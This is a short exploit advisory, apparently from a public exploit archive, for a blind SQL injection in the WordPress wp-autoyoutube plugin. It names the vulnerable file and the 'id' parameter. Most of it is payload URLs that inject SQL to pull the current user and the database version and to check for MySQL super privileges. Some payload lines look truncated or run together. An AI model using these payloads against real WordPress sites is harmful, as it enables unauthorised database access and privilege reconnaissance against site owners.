@@ -1,0 +1,22 @@
+######################################################
+# Exploit Title: WordPress wp-autoyoutube plugin Blind SQL Injection
+Vulnerability
+# Date: 2012-11-01
+# Author: longrifle0x
+# software: Wordpress
+# Download:http://wordpress.org/extend/plugins/wp-autoyoutube/
+# Tools: SQLMAP
+######################################################
+
+*DESCRIPTION
+Discovered a vulnerability in  wp-autoyoutube, Wordpress Plugin,
+vulnerability is Blind SQL injection.
+
+File:wp-content/plugins/wp-autoyoutube/modules/index.php
+Exploit: id=-1; or 1=if
+
+*Exploitation*http://localhost:80/wp-content/plugins/wp-autoyoutube/modules/index.php[GET][id=-1][CURRENT_USER()
+http://localhost:80/wp-content/plugins/wp-autoyoutube/modules/index.php[GET][id=-1][SELECT(CASE
+WHEN ((SELECT super_priv FROMmysql.user WHERE user='None' LIMIT
+0,1)='Y') THEN 1 ELSE 0 END)
+http://localhost:80/wp-content/plugins/wp-autoyoutube/modules/index.php[GET][id=-1][MID((VERSION()),1,6)
